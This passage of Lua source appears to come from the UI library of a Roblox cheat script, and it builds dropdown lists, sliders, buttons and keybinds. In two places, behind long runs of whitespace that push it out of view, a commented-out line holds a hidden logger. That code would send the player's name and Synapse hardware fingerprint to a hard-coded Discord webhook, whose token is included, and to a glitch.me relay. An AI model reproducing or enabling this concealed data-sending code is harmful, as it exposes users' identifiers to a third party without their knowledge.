										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										first = false 
							Players.PlayerAdded:Connect(function(player)
								Button:Destroy()
								TextLabel:Destroy()
							end)
 
							Players.PlayerRemoving:Connect(function(player) 
								Button:Destroy()
								TextLabel:Destroy()
							end)
									end 
								end 
							end
gay()



Players.PlayerAdded:Connect(function()
table.clear(data.options)
for i,v in pairs(game.Players:GetPlayers()) do
C.INSERT(data.options, v.Name)
end
	gay()
end)
																																																																																																																																																																																																																																																																																																														--if not signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
Players.PlayerRemoving:Connect(function() 
table.clear(data.options)
for i,v in pairs(game.Players:GetPlayers()) do
C.INSERT(data.options, v.Name)
end
	gay()
end)

--[[for _,Player in pairs(game.Players:GetPlayers()) do
	if Player ~= LocalPlayer then
		table.clear(data.options)
		data.options = {}
		if  GetTeam(Player) ~= "TTT" and GetTeam(Player) ~= GetTeam(LocalPlayer) then
			insertwithoutdupes(data.options, Player.Name)
			gay()
			print(Player.Name.. "has been added in list in getplayers")
		elseif GetTeam(Player) ~= "TTT" then
			removewithoutdupes(data.options, Player.Name)
			gay()
			print(Player.Name.. "has been deleted from list in getplayers")
		end
	end
end

for _, team in pairs(game:GetService("Teams"):GetTeams()) do
if team ~= "TTT" then
	team.PlayerAdded:connect(function(player)
		if player.Name == LocalPlayer then
			for i,v in pairs(data.options) do
				if GetTeam(i) == GetTeam(LocalPlayer) and GetTeam(LocalPlayer) ~= 'TTT' then
					removewithoutdupes(data.options, v)
					print("removed in list "..v.. " in localplayer teamchanged event")
					gay()
				elseif GetTeam(i) ~= GetTeam(LocalPlayer) and GetTeam(LocalPlayer) ~= 'TTT' then
					insertwithoutdupes(data.options, v)
					print("added in list "..v.. " in localplayer teamchanged event")
					gay()
				end
			end
		else
			if team ~= GetTeam(LocalPlayer) then
				insertwithoutdupes(data.options, player.Name)
				gay()
			else
				removewithoutdupes(data.options, player.Name)
				gay()
			end
		end
	end)
end
end--]]
								function Element:SetValue(val) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
								values[tabname][sectorname][text] = Element.value	
									
								
							elseif type == "lmao2" then	
								
								local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 
								if data.alphabet then 
									C.TBLSORT(data.options, function(a,b) 
										return a < b 
									end) 
								end 
								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]} 

								local Scroll = C.INST("Frame") 
								local Frame = C.INST("ScrollingFrame") 
								local UIListLayout = C.INST("UIListLayout") 

								Scroll.Name = "Scroll" 
								Scroll.Parent = Inner 
								Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Scroll.BackgroundTransparency = 1.000 
								Scroll.Position = C.UDIM2(0, 0, 00, 0) 
								Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 


								Frame.Name = "Frame" 
								Frame.Parent = Scroll --  
								Frame.Active = true 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(0, 30, 0, 0) 
								Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
								Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.ScrollBarThickness = 4 
								Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.AutomaticCanvasSize = "Y" 
								Frame.ScrollBarImageColor3 = MainUIColor 
														function MenuAccent(color)
															Frame.ScrollBarImageColor3 = color
														end
								UIListLayout.Parent = Frame 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
								local first = true
								function updatescroll2() 
									for i,v in ipairs(data.options) do
									
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Frame 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.BorderSizePixel = 0 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(1, 0, 0, 16) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
										TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										if first then first = false 
											TextLabel.TextColor3 = MainUIColor
											function MenuAccent(color)
												TextLabel.TextColor3 = MainUIColor
											end								
										end 

										Button.MouseButton1Down:Connect(function() 

											for i,v in pairs(Frame:GetChildren()) do 
												if v:IsA("TextButton") then 
													library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
												end 
											end 

											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 

											Element.value.Scroll = v 

											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											if Element.value.Scroll ~= v then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
											end 
										end) 
										Button.MouseLeave:Connect(function() 
											if Element.value.Scroll ~= v then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end) 
										Players.PlayerAdded:Connect(function(player)
											Button:Destroy()
											TextLabel:Destroy()
										end)
			 
										Players.PlayerRemoving:Connect(function(player)
											Button:Destroy()
											TextLabel:Destroy()
										end)										
									end
								end
updatescroll2()



Players.PlayerAdded:Connect(function()
table.clear(data.options)
for i,v in pairs(game.Players:GetPlayers()) do
C.INSERT(data.options, v.Name)
end
	updatescroll2()
end)
																																																																																																																																																																																																																																																																																																														--if not signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
Players.PlayerRemoving:Connect(function() 
table.clear(data.options)
for i,v in pairs(game.Players:GetPlayers()) do
C.INSERT(data.options, v.Name)
end
	updatescroll2()
end)
								function Element:SetValue(val) 
									Element.value = val 

									for i,v in pairs(Frame:GetChildren()) do 
										if v:IsA("TextButton") then 
											library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end 

									library:Tween(Frame[Element.value.Scroll].TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								values[tabname][sectorname][text] = Element.value
								
								
								
								
								
								
								
								
								
								
								
								
								
									
								
							elseif type == "Slider" then 

								Section.Size = Section.Size + C.UDIM2(0,0,0,25) 

								local Slider = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 
								local Button = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local UIGradient = C.INST("UIGradient") 
								local Value = C.INST("TextLabel") 

								Slider.Name = "Slider" 
								Slider.Parent = Inner 
								Slider.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider.BackgroundTransparency = 1.000 
								Slider.Position = C.UDIM2(0, 0, 0.653061211, 0) 
								Slider.Size = C.UDIM2(1, 0, 0, 25) 

								TextLabel.Parent = Slider 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								Button.Name = "Button" 
								Button.Parent = Slider 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 15) 
								Button.Size = C.UDIM2(0, 175, 0, 5) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Frame.Parent = Button 
								Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame.BorderSizePixel = 0 
								Frame.Size = C.UDIM2(0.5, 0, 1, 0) 
								
								UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient.Rotation = 90
								UIGradient.Parent = Frame


								Value.Name = "Value" 
								Value.Parent = Slider 
								Value.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value.BackgroundTransparency = 1.000 
								Value.Position = C.UDIM2(0, 30, 0, 15) 
								Value.Size = C.UDIM2(0, 175, 0, 5)  
								Value.Font = Enum.Font.Gotham 
								Value.Text = "50" 
								Value.TextStrokeTransparency = 0.000
								Value.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value.TextSize = 11.000 
								local min, max, default = data.min or 0, data.max or 100, data.default or 0 
								Element.value = {Slider = default} 

								function Element:SetValue(value) 
									Element.value = value 
									local a 
									if min > 0 then 
										a = ((Element.value.Slider - min)) / (max-min) 
									else 
										a = (Element.value.Slider-min)/(max-min) 
									end 
									Value.Text = Element.value.Slider 
									Frame.Size = C.UDIM2(a,0,1,0) 
									values[tabname][sectorname][text] = Element.value 
									callback(value) 
								end 
								local a 
								if min > 0 then 
									a = ((Element.value.Slider - min)) / (max-min) 
								else 
									a = (Element.value.Slider-min)/(max-min) 
								end 
								Value.Text = Element.value.Slider 
								Frame.Size = C.UDIM2(a,0,1,0) 
								values[tabname][sectorname][text] = Element.value 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button.MouseButton1Down:Connect(function() 
									Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
									val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min) or 0 
									
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
											--print(val)
											--print(typeof(val))
										end
										print(val)
										print(typeof(val))			
									Value.Text = val 
									Element.value.Slider = val 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
									moveconnection = mouse.Move:Connect(function() 
										Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
										val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min) 
										
										
										--print(val)
										--print(typeof(val))
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
											--print(val)
											--print(typeof(val))
										end
										Value.Text = val 
										Element.value.Slider = val 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
											val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
											--print(val)
											--print(typeof(val))
										end
										print(val)
										print(typeof(val))
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
							elseif type == "Button2" then 
								errorCode = (data.errorCode or 'Error!')
								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 175, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 
								
								
								local pressedButton = false
								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = MainUIColor 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									if TextLabel.Text ~= 'Are you sure?' then
										TextLabel.Text = 'Are you sure?'
										wait(4)
										if not pressedButton then
											TextLabel.Text = text
										end
									elseif TextLabel.Text == 'Are you sure?' then
										pressedButton = true
										local lmfaooo, lol = pcall(function()
											callback()
										end)
											if lmfaooo then
												TextLabel.Text = 'Success!'
												wait(1)
												TextLabel.Text = text
											else 
												TextLabel.Text = errorCode
												wait(1)
												TextLabel.Text = text
												print(lol)
											end
										pressedButton = false
									end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
elseif type == "Button" then 
								errorCode = 'Error!'

								
								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 175, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 
								
								
								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = MainUIColor 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()
											callback()
										end)
											if lmfaooo then
												TextLabel.Text = 'Success!'
												wait(1)
												TextLabel.Text = text
											else 
												TextLabel.Text = errorCode
												wait(1)
												TextLabel.Text = text
												print(lol)
											end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)		
								
								
								
								
								
								
							elseif type == "ButtonKeybind" then 

								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								Element.value = {Key = data.default and data.default.Key or nil} 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 140, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 

								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = MainUIColor 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()
										callback()
											end)
										if lmfaooo then
										TextLabel.Text = 'Success!'
										wait(1)
										TextLabel.Text = text
										else 
										TextLabel.Text = 'Error!'
										wait(1)
										TextLabel.Text = text
										print(lol)
										end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
								do 
									local Keybind = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Always = C.INST("TextButton") 
									local UIListLayout = C.INST("UIListLayout") 
									local Hold = C.INST("TextButton") 
									local Toggle = C.INST("TextButton") 
									local ButtonKey = C.INST('TextButton')

									Keybind.Name = "Keybind" 
									Keybind.Parent = Button 
									Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
									Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
									Keybind.Text = data.default and data.default.Key or 'none'
									Keybind.Size = C.UDIM2(0, 43, 0, 12) 
									Keybind.Size = C.UDIM2(0,txt:GetTextSize("NONE", 14, Enum.Font.SourceSansSemibold, C.Vec2(700, 12)).X + 5,0, 12)
									Keybind.AutoButtonColor = false 
									Keybind.Font = Enum.Font.Gotham 
									Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
									Keybind.TextSize = 11.000
									Keybind.AnchorPoint = C.Vec2(1,0) 
									Keybind.ZIndex = 3 

									--[[Frame.Parent = Keybind 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(1, -49, 0, 1) 
									Frame.Size = C.UDIM2(0, 49, 0, 49) 
									Frame.Visible = false 
									Frame.ZIndex = 3

									UIListLayout.Parent = Frame 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									Hold.Name = "Hold" 
									Hold.Parent = Frame 
									Hold.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Hold.BackgroundTransparency = 1.000 
									Hold.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Hold.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Hold.Size = C.UDIM2(1, 0, 0, 16) 
									Hold.AutoButtonColor = false 
									Hold.Font = Enum.Font.Gotham 
									Hold.Text = "Hold" 
									Hold.TextColor3 = C.COL3RGB(200, 200, 200) 
									Hold.TextSize = 11.000
									Hold.ZIndex = 3

									Toggle.Name = "Toggle" 
									Toggle.Parent = Frame 
									Toggle.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Toggle.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Toggle.Size = C.UDIM2(1, 0, 0, 16) 
									Toggle.AutoButtonColor = false 
									Toggle.Font = Enum.Font.Gotham 
									Toggle.Text = "Toggle" 
									Toggle.TextColor3 = C.COL3RGB(200, 200, 200) 
									Toggle.TextSize = 11.000
									Toggle.ZIndex = 3 --]]

									--[[for _,button in pairs(Frame:GetChildren()) do 
										if button:IsA("TextButton") then 
											button.MouseButton1Down:Connect(function() 
												Element.value.Type = button.Text 
												Frame.Visible = false 
												if Element.value.Active ~= (Element.value.Type == "Always" and true or false) then 
													Element.value.Active = Element.value.Type == "Always" and true or false 
													callback(Element.value) 
												end 
												if button.Text == "Always" then 
													keybindremove(text, Element.value.Key) 
												end 
												for _,button in pairs(Frame:GetChildren()) do 
													if button:IsA("TextButton") and button.Text ~= Element.value.Type then 
														button.Font = Enum.Font.Gotham 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
													end 
												end 
												button.Font = Enum.Font.SourceSansBold 
												button.TextColor3 = C.COL3RGB(173, 24, 74) 
												values[tabname][sectorname][text] = Element.value 
											end) 
											button.MouseEnter:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255,255,255)}) 
												end 
											end) 
											button.MouseLeave:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
												end 
											end) 
										end 
									end --]]
									Keybind.MouseButton1Down:Connect(function() 
										if not binding then 
											wait() 
											binding = true 
											Keybind.Text = "..." 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
										end 
									end) 
									--[[Keybind.MouseButton2Down:Connect(function() 
										if not binding then 
